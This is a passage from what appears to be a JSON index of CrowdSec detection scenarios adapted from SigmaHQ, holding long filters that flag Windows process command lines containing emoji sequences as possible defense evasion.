'\ud83d\udeb5\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udec0\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udecc\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc4b\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd1a\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udd90\ud83c\udffc' || evt.Parsed.CommandLine contains '\u270b\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udd96\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc4c\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd0c\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd0f\ud83c\udffc' || evt.Parsed.CommandLine contains '\u270c\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd1e\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd1f\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd18\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd19\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc48\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc49\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc46\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udd95\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc47\ud83c\udffc' || evt.Parsed.CommandLine contains '\u261d\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc4d\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc4e\ud83c\udffc' || evt.Parsed.CommandLine contains '\u270a\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc4a\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd1b\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd1c\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc4f\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\ude4c\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc50\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd32\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\ude4f\ud83c\udffc' || evt.Parsed.CommandLine contains '\u270d\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udcaa\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddb5\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddb6\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc42\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddbb\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc43\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc76\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc67\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd2\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc66\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc75\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd3\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc74\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc72\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd5\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc78\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd34\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd77\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd36\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf84' || evt.Parsed.CommandLine contains '\ud83c\udf85\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc7c\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd30\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd31\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffc\u200d\u2640\ufe0f')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 1\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.\n", "path": "scenarios/sigmahq/proc_creation_win_susp_emoji_usage_in_cli_1.yml", "version": "0.2", "versions": {"0.1": {"digest": "76ab24bee62faa9d862ff707a990bfc8d0d049d7cea8c9585078340f53f281a9"}, "0.2": {"digest": "27d57ca0479e00be2431df31e289fe921064078ffb72598b539e8ead50784d84"}}}, "sigmahq/proc_creation_win_susp_emoji_usage_in_cli_2": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_emoji_usage_in_cli_2\ndescription: |\n  Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc83\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udd7a\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udd74\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6d\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc6c\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc6b\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc7\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83c\udfc2\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffc' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udec0\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udecc\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc4b\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd1a\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udd90\ud83c\udffd' || evt.Parsed.CommandLine contains '\u270b\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udd96\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc4c\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd0c\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd0f\ud83c\udffd' || evt.Parsed.CommandLine contains '\u270c\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd1e\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd1f\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd18\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd19\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udffd' || 